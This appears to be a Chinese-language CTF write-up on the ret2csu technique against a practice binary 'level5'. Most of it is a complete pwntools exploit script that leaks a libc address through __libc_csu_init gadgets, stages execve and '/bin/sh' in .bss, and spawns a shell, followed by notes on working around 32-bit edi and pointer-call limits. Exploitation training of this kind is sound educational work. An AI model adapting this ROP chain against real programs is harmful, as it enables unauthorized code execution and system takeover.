\_\_libc\_csu\_init：这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。

```
#!/usr/local/bin/python3

from pwn import *
from LibcSearcher import LibcSearcher

context.log_level = 'debug'

sh = gdb.debug('./level5', "b *0x400586")
elf = ELF('./level5')

# __libc_csu_init:
# .text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54↓j
# .text:0000000000400600                 mov     rdx, r13
# .text:0000000000400603                 mov     rsi, r14
# .text:0000000000400606                 mov     edi, r15d
# .text:0000000000400609                 call    qword ptr [r12+rbx*8]
# .text:000000000040060D                 add     rbx, 1
# .text:0000000000400611                 cmp     rbx, rbp
# .text:0000000000400614                 jnz     short loc_400600
# .text:0000000000400616
# .text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34↑j
# .text:0000000000400616                 add     rsp, 8
# .text:000000000040061A                 pop     rbx
# .text:000000000040061B                 pop     rbp
# .text:000000000040061C                 pop     r12
# .text:000000000040061E                 pop     r13
# .text:0000000000400620                 pop     r14
# .text:0000000000400622                 pop     r15
# .text:0000000000400624                 retn

libc_csu_init_pop_ret = 0x40061A
libc_csu_init_call_r12 = 0x400600

main_addr = 0x400587

def csuCallFunc(addr, arg1, arg2, arg3):
    payload=flat([
        b'A'*128, 
        p64(0xdeadbeef),
        p64(libc_csu_init_pop_ret),
        p64(0), #rbx
        p64(1), #rbp
        p64(addr), #r12
        p64(arg3), #r13
        p64(arg2), #r14
        p64(arg1), #r15
        p64(libc_csu_init_call_r12),
        b'A'*56, 
        p64(main_addr) #400624 retn main
        ])
    sh.recvuntil(b"Hello, World\n")
    sh.send(payload)
    

csuCallFunc(elf.got['write'], 1, elf.got['write'], 8)

write_addr = u64(sh.recv(8))
print("writeaddr:0x%x" %write_addr)
libc = LibcSearcher('write', write_addr)
libcbase = write_addr - libc.dump('write')
system_addr = libcbase + libc.dump('system')
execve_addr = libcbase + libc.dump('execve')
# bin_sh_addr = libcbase + libc.dump('str_bin_sh')  

bin_sh_str = '/bin/sh\0'
bss_addr = 0x601040


csuCallFunc(elf.got['read'], 0, bss_addr, len(bin_sh_str) + 8)
payload = payload=flat([
    p64(execve_addr),
    bin_sh_str
])
sh.send(payload)

csuCallFunc(bss_addr, bss_addr + 8, 0, 0)

sh.interactive()
```

问题一：参数一只能控制低32位

```
400606                 mov     edi, r15d
```

所以不能用libc中的/bin/sh

解决方法：把字符串放到bss段，使用bss段传参

问题二：调用的是二级指针

```
# .text:0000000000400609                 call    qword ptr [r12+rbx*8]
```

解决方法：把函数地址放到bss段，使r12=bss，rbx=0

system函数确实没反弹shell，不知道原因

execve('/bin/sh',0,0)成功反弹shell
